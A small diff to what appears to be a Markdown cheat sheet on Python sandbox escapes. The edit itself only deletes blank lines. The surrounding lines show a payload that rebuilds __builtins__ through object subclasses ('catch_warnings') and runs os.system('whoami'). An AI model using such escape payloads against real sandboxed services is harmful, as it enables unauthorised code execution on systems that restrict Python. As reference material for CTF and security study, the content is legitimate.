@@ -72,9 +72,6 @@ system('ls')
 * Restore builtin using its sub-modules
   * `__builtins__ = [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__`
   * `__builtins__['__import__']('os').system('whoami')`
-
-
-
 * other methods
 
 ```python
